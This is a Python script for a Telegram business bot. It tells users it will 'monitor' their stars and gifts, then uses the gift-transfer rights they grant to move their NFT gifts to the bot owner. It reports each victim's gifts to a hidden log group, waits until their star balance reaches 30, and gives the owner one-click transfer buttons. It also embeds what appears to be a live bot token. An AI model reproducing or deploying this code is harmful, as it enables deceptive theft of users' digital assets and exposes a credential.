import asyncio
import logging
from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Text
from aiogram.types import BusinessConnection, BusinessBotRights, Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods import GetBusinessAccountGifts, GetBusinessAccountStarBalance, TransferGift

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613
CHECK_INTERVAL = 60  # seconds

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

authorized = {}  # user_id → {connection_id, username, gifts, stars, notified}

@dp.business_connection()
async def on_business_connect(con: BusinessConnection):
    rights: BusinessBotRights = con.rights or BusinessBotRights()
    if not (rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
        await bot.send_message(con.user.id,
            "❌ Please grant full Gifts & Stars permissions to use this bot.",
            business_connection_id=con.id)
        return

    resp = await bot(GetBusinessAccountGifts(business_connection_id=con.id))
    gifts = resp.gifts or []
    authorized[con.user.id] = {
        "connection_id": con.id,
        "username": f"@{con.user.username}" if con.user.username else con.user.first_name,
        "gifts": [(g.owned_gift_id, g.unique_gift.title if getattr(g, "unique_gift", None) else g.title)],
        "stars": 0,
        "notified": False
    }

    gift_list = "\n".join(f"- {title}" for _, title in authorized[con.user.id]["gifts"]) or "(no NFTs)"
    await bot.send_message(LOG_GROUP_ID,
        f"✅ <a href='tg://user?id={con.user.id}'>{con.user.first_name}</a> granted gift rights.\nNFTs:\n{gift_list}")
    await bot.send_message(con.user.id, "🎉 Connected! Monitoring your stars & gifts now.", business_connection_id=con.id)

async def check_balance_and_notify(uid: int):
    u = authorized.get(uid)
    if not u:
        return
    res = await bot(GetBusinessAccountStarBalance(business_connection_id=u["connection_id"]))
    u["stars"] = res.balance.amount
    if u["stars"] >= 30 and not u["notified"]:
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(f"Send {title}", callback_data=f"xfer:{uid}:{gift_id}")]
            for gift_id, title in u["gifts"]
        ])
        await bot.send_message(OWNER_ID,
            f"🎉 {u['username']} has {u['stars']} stars. Choose an NFT to transfer:",
            reply_markup=markup)
        u["notified"] = True

async def periodic_star_check():
    while True:
        for uid in list(authorized):
            await check_balance_and_notify(uid)
        await asyncio.sleep(CHECK_INTERVAL)

@dp.callback_query(Text(startswith="xfer:"))
async def on_transfer(cb: CallbackQuery):
    _, uid_str, gift_id = cb.data.split(":")
    uid = int(uid_str)
    u = authorized.get(uid)
    if cb.from_user.id != OWNER_ID or not u:
        await cb.answer("❌ Not allowed.", show_alert=True)
        return

    result = await bot(TransferGift(
        business_connection_id=u["connection_id"],
        owned_gift_id=gift_id,
        new_owner_chat_id=OWNER_ID,
        star_count=25
    ))
    if result:
        await cb.message.edit_text("✅ NFT transferred to Owner.")
        await bot.send_message(LOG_GROUP_ID,
            f"🎁 Gift {gift_id} transferred from {u['username']} to owner.")
    else:
        await cb.answer("❌ Transfer failed.", show_alert=True)

@dp.message(Text("/start") & (Message.from_user.id == OWNER_ID))
async def begin_monitor(message: Message):
    asyncio.create_task(periodic_star_check())
    await message.reply("✅ Star monitoring loop started.")

if __name__ == "__main__":
    asyncio.run(dp.start_polling(bot))
